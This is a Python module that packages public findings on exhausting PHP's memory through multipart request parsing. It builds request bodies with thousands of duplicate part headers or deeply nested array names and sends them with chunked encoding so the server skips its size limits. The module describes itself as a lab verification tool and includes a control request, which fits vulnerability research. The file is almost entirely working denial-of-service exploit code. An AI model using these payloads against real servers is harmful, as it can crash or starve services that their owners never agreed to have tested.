"""Memory-amplification and chunked-delivery primitives.

Two public findings this module packages for lab verification:

1. **Duplicate multipart part headers** (dinosn): PHP stores every part
   header in a fixed 256-byte smart_str, so a 6-byte `X: a` line costs ~314
   bytes of heap. A ~2.5 MB body can therefore exhaust a 128 MB
   `memory_limit` — the practical `post_max_size` barrier is defeated while
   the wire stays under 8 MB.

2. **Nested-array probe** (Assetnote): a part name nested 62 levels deep,
   repeated across parts. Used by the public scanner as a low-impact
   vulnerability oracle (1–20 MiB tiers).

3. **Chunked / lengthless delivery**: on mod_php, Apache de-chunks into a
   stream with no usable declared length, so `rfc1867`'s declared-length
   gate is skipped (the delivery vehicle the Wiz/9bie chains use). On FPM
   the declared `CONTENT_LENGTH` clamp means this is a no-op (see
   poc/verify_postmax_bypass.py).

All builders return raw multipart bytes; `send_chunked` frames them.
"""

import socket

from . import probe


def duplicate_header_body(target_bytes, boundary="AMP", header=b"X: a",
                          part_name=b"p0000", tail=b"v"):
    """Body whose parsed heap cost is ~52x its wire size.

    Each `header` line is stored as a separate 256-byte smart_str by the
    multipart parser. Layout:

        --b
        Content-Disposition: form-data; name="p0000"
        X: a
        ... (N times)
        <blank>
        v
        --b--
    """
    line = header + b"\r\n"
    head = (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="' + part_name + b'"\r\n'
    )
    foot = b"\r\n" + tail + b"\r\n--" + boundary.encode() + b"--\r\n"
    fixed = len(head) + len(foot) + 2  # terminating blank line
    if target_bytes <= fixed:
        raise ValueError("target_bytes too small for one part")
    n = (target_bytes - fixed) // len(line)
    return head + line * n + foot


def duplicate_header_count(target_bytes, boundary="AMP", header=b"X: a"):
    """How many duplicate header lines a body of `target_bytes` contains."""
    head = (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="p0000"\r\n'
    )
    foot = b"\r\nv\r\n--" + boundary.encode() + b"--\r\n"
    fixed = len(head) + len(foot) + 2
    return max(0, (target_bytes - fixed) // (len(header) + 2))


def nested_array_body(size_bytes, parts=4000, depth=62, boundary="NEST",
                      filename=b""):
    """Assetnote-style probe: `a[a][a]...` key nested `depth` levels.

    Repeats a minimal empty-file part; the rest of the requested wire size
    is filled with short header lines (`x:\\n`) to keep the body in one
    allocation regime.
    """
    name = b"a[]" + b"[a]" * (depth - 1)
    part = (
        b"--" + boundary.encode() + b"\r\n"
        b"Content-Disposition: form-data; name=\"" + name +
        b"\";filename=\"" + filename + b"\"\r\n\r\n"
    )
    if parts * len(part) > size_bytes:
        parts = max(1, size_bytes // len(part))
    base = part * parts
    pad_len = max(0, size_bytes - len(base) - 8)
    filler = b"x:\n" * (pad_len // 3)
    return b"--" + boundary.encode() + b"\r\n" + filler + base[len(b"--" + boundary.encode() + b"\r\n"):] + b"\r\n"


def send_chunked(host, port, path, body, content_type,
                 boundary=None, chunk_size=65536, timeout=120,
                 extra_headers=""):
    """POST with Transfer-Encoding: chunked and no Content-Length."""
    if boundary is None:
        boundary = "CHUNK"
    preamble = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: {content_type}; boundary={boundary}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"{extra_headers}\r\n"
    ).encode("latin-1")
    out = [preamble]
    for i in range(0, len(body), chunk_size):
        chunk = body[i:i + chunk_size]
        out.append(b"%x\r\n" % len(chunk) + chunk + b"\r\n")
    out.append(b"0\r\n\r\n")
    return probe.send_once(host, port, b"".join(out), timeout=timeout)


def send_declared(host, port, path, body, content_type, boundary=None,
                  timeout=120, extra_headers=""):
    """Control: identical body with a declared Content-Length."""
    if boundary is None:
        boundary = "CHUNK"
    headers = {
        "Content-Type": f"{content_type}; boundary={boundary}",
        "Content-Length": str(len(body)),
    }
    return probe.http_post(host, port, path, body, headers=headers,
                           timeout=timeout,
                           recv_timeout=timeout)
